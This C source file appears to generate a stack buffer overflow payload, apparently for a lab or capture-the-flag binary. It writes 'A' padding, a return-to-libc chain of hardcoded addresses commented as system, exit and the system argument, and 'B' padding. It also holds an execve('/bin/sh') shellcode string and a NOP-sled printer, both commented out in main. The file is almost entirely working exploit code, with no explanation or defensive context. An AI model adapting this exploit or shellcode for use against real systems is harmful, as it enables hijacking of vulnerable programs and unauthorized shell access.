#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
int32_t swap_int32( int32_t val )
{
    val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF ); 
    return (val << 16) | ((val >> 16) & 0xFFFF);
}

void print_padding(const unsigned int padding_size, int c) 
{
  for(unsigned int i = 0;i<padding_size;i++) {
    printf("%c", c);
  } 
}

void print_nop(const unsigned int padding_size) 
{
  for(unsigned int i = 0;i<padding_size;i++) {
    printf("%c", 0x90);
  } 
}

void print_shellcode() 
{
  // execve("/bin/sh")
  const char* scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
  const unsigned int scode_len = strlen(scode);
  for(int i = 0; i < scode_len; i++) {
    printf("%c", scode[i]);
  }
}

void print_ret_addr(const int addr) 
{
  const int sret = swap_int32(addr);
  printf("%c", sret >> 24 ) ;
  printf("%c", sret >> 16 );
  printf("%c", sret >> 8 );
  printf("%c", (sret & 0xff));
}

int main(int argc, char* argv[]) 
{
  /*if(argc > 1) {
    int ps = atoi(argv[1]);
    print_padding(ps);
  } else {
    print_padding(268);
  }*/

  print_padding(96, 0x41);
  print_ret_addr(0xf7e0f420); // system
//  print_ret_addr(0xf7e01f80); // exit 00037f80
//  print_ret_addr(0xf7f59352); // system arg 18f352

//  print_ret_addr(0x565560c0); // system
  print_ret_addr(0x565560d0); // exit 00037f80
  print_ret_addr(0x56557008); // system arg 18f352
  print_padding(152, 0x42);
  //print_ret_addr(0xffffcf94);

  //print_nop(100);

  //print_shellcode();

  return 0;
}


